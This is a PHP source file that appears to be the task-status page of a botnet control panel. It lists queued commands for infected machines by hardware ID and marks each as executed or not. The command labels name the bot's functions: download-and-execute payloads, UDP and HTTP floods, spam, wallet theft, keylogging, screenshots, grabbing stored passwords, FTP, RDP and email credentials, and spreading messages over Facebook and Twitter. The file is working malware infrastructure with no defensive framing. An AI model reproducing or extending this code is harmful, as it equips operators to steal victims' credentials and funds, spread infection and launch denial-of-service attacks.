<?php
error_reporting(0);
session_start();
require_once('session.php');
require_once('config.php');

$query_1 = mysql_query("SELECT COUNT(*) FROM commands");
$query_1 = mysql_query("SELECT * FROM commands ORDER BY id DESC");

if (isset($_GET['a']))
  {
    $hwid = addslashes(base64_decode($_GET['a']));
    mysql_query("DELETE FROM commands WHERE hwid LIKE '$hwid'");
    header('Location: exec.php');
  }

echo '<meta http-equiv="refresh" content="5">

<link rel="stylesheet" type="text/css" href="../css/log.css"/>
<link rel="stylesheet" type="text/css" href="../css/sbody.css"/>

<div class="datagrid">
  <table>
    <thead>
      <tr>
        <th colspan="5" align="center">
          Tasks Status
        </th>
      </tr>
    </thead>
    
    <tbody>
      <tr>
        <td>
          <b>
            HWID
          </b>
        </td>
        <td>
          <b>
            Command
          </b>
        </td>
        <td>
         <b>
          Variable
         </b>
        </td>
        <td>
         <b>
          Status
          </b>
        </td>
        <td>
         <b>
          Actions
          </b>
        </td>
      </tr>';

while ($row = mysql_fetch_array($query_1))
  {
  	echo '<tr class="alt"><td>'.$row['hwid'].'</td>';
  	echo '<td>';
  		if ($row["cmd"] == 'DL')
      		{
        	 echo 'Download & Execute [RAM]';
      		}
    
    		if ($row['cmd'] == 'DD')
      		{
        	 echo 'Download & Execute [Disk]';
      		}
      		
               if ($row["cmd"] == 'VV')
      		{
        	 echo 'Open webpage [Visible]';
      		}
    
    		if ($row['cmd'] == 'VH')
      		{
        	 echo 'Open webpage [Hidden]';
      		}
      		
      		if ($row["cmd"] == 'UD')
      		{
        	 echo 'UDP Flood';
      		}
    
    		if ($row['cmd'] == 'HT')
      		{
        	 echo 'HTTP Flood';
      		}
      		
      		if ($row["cmd"] == 'AH')
      		{
        	 echo 'Activate/Deactivate Host';
      		}
    
    		if ($row['cmd'] == 'PS')
      		{
        	 echo 'Activate/Deactivate PoS';
      		}
      		
      		if ($row["cmd"] == 'SP')
      		{
        	 echo 'Start SPAM';
      		}
      		
      		if ($row["cmd"] == 'HP')
      		{
        	 echo 'Firefox Homepage Changer';
      		}
      		
      		if ($row["cmd"] == 'DS')
      		{
        	 echo 'FB/Twitter Message Spreader';
      		}
    
    		if ($row['cmd'] == 'BS')
      		{
        	 echo 'Steal Wallets';
      		}
      		
      		if ($row["cmd"] == 'KY')
      		{
        	 echo 'Start/Stop Keylogger';
      		}
    
    		if ($row['cmd'] == 'TS')
      		{
        	 echo 'Take Screenshot';
      		}
      		 
      		 if ($row["cmd"] == 'VI')
      		{
        	 echo 'Grab Passwords';
      		}
    
    		if ($row['cmd'] == 'FZ')
      		{
        	 echo 'Grab FTP';
      		}
      		 
      		 if ($row["cmd"] == 'GR')
      		{
        	 echo 'Grab RDP';
      		}
    
    		if ($row['cmd'] == 'GE')
      		{
        	 echo 'Grab Email';
      		}
      		
      		 if ($row["cmd"] == 'UP')
      		{
        	 echo 'Update';
      		}
    
    		if ($row['cmd'] == 'UN')
      		{
        	 echo 'Uninstall';
      		}
      		echo '</td>';
  	echo '<td>';
  		if ($row['variable'] == '')
			 {
			  echo 'NOT REQUIRED';
			 }
			else
			 {
			  echo $row['variable'];
			 }
	echo '</td>';
  	echo '<td>';
  		if ($row["viewed"] == '1')
      		{
        	 echo '<font color="#299868">EXECUTED<font>';
      		}
    
    		if ($row['viewed'] == '0')
      		{
        	 echo '<font color="red">NOT EXECUTED<font>';
      		}
       echo '</td>';
       echo '<td><a href="exec.php?a='.base64_encode($row['hwid']).'">Delete Task</a></td></tr>';
  	
  }
  
?>
	